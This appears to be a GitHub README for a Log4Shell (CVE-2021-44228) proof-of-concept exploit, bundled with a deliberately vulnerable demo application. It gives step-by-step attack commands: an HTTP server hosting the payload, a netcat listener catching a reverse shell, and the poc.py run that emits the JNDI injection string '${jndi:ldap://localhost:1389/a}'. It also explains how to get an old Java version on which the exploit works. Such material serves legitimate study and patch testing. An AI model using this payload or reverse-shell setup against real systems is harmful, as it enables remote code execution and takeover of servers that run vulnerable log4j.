# log4j-shell-poc
A Proof-Of-Concept for the recently found CVE-2021-44228 vulnerability. <br><br>
Recently there was a new vulnerability in log4j, a java logging library that is very widely used in the likes of elasticsearch, minecraft and numerous others.

In this repository we have made and example vulnerable application and proof-of-concept (POC) exploit of it.


A video showing the exploitation process
----------------------------------------
https://user-images.githubusercontent.com/46561460/145657039-5f844e8c-e90c-4dd1-9f32-02b27068c6a2.mp4


Minecraft PoC:

https://user-images.githubusercontent.com/87979263/145681727-2bfd9884-a3e6-45dd-92e2-a624f29a8863.mp4

<br>

Proof-of-concept (POC)
----------------------



As a POC we have created a python file that automates the process.

* Start an http server.<br>
**Note:** This must be run in the same directory as the rest of the repository.
```py
sudo python3 -m http.server 80
```
* Start a netcat listener to accept reverse shell connection.<br>
```py
nc -lvnp 9001
```
* Launch the exploit.<br>
**Note:** For this to work, the extracted java archive has to be named: `jdk1.8.0_20`, and be in the same directory.
```py
python3 poc.py
java version "1.8.0_20"
Java(TM) SE Runtime Environment (build 1.8.0_20-b26)
Java HotSpot(TM) 64-Bit Server VM (build 25.20-b23, mixed mode)


[+] Enter IP for LDAPRefServer & Shell: localhost
[+] Enter listener port for LDAPRefServer: 80
[+] Set listener port for shell: 9001
[+] Send me: ${jndi:ldap://localhost:1389/a}

Listening on 0.0.0.0:1389
```

<br>


Our vulnerable application
--------------------------

Running the application currently is easiest done in the payed version of intelj, but we plan on adding a Dockerfile in the future.

If you would like to further develop the project you can use intelj IDE which we used to develop the project. We have also included a `.idea` folder where we have configuration files which make the job a bit easier. You can probably also use other IDE's too.

<br>

Getting an old enough version of java.
--------------------------------------

The exploit only works with very old versions of java 8. We are unsure of exactly which java versions work and which don't so we have chosen to work with one of the earliest versions of java 8: `java-8u20`.

Oracle thankfully provides an archive for all previous java versions:<br>
[https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html](https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html).<br>
Scroll down to `8u20` and download the appropriate files for your operating system and hardware.
![Screenshot from 2021-12-11 00-09-25](https://user-images.githubusercontent.com/46561460/145655967-b5808b9f-d919-476f-9cbc-ed9eaff51585.png)

**Note:** You do need to make an account to be able to download the package.

Once you have downloaded and extracted the archive, you can find `java` and a few related binaries in `jdk1.8.0_20/bin`.<br>
**Note:** Please make sure to extract the jdk folder into this repository with the same name in order for it to work.

```
❯ tar -xf jdk-8u20-linux-x64.tar.gz

❯ ./jdk1.8.0_20/bin/java -version
java version "1.8.0_20"
Java(TM) SE Runtime Environment (build 1.8.0_20-b26)
Java HotSpot(TM) 64-Bit Server VM (build 25.20-b23, mixed mode)
```
